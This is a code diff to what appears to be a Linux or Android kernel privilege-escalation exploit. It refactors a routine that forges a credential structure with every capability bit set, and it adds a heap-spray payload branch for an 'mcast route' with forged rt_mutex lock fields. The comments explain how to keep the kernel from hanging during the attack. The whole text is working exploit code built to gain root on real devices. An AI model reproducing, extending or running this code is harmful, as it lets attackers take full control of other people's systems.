@@ -314,11 +314,9 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
   unsigned char *c = p + off;
   memset(c, 0, 136);
   put32(c, 0, 1);
-  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
+  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
+    put64(c, CRED_CAPS_OFF + i * 8, 0xFFFFFFFFFFFFFFFFULL);
+  }
 }
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
@@ -544,10 +542,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
     put32(p, LOCK_OFF + 0x00, 0);
-    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+    if (active_offsets && active_offsets->mcast_payload_off &&
+        payload_mode == PAGE_PAYLOAD_FOPS) {
+      /* mcast route: rt_mutex_adjust_prio_chain must exit at [9] with
+       * owner == NULL. A non-NULL owner walks [10]-[11] and dereferences
+       * fake_task->pi_blocked_on (page garbage), which hangs the device.
+       * Keep the waiters tree empty; rb_erase then operates directly on the
+       * stack waiter tree_entry. */
+      put64(p, LOCK_OFF + 0x08, 0);
+      put64(p, LOCK_OFF + 0x10, 0);
+      put64(p, LOCK_OFF + 0x18, 0);
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
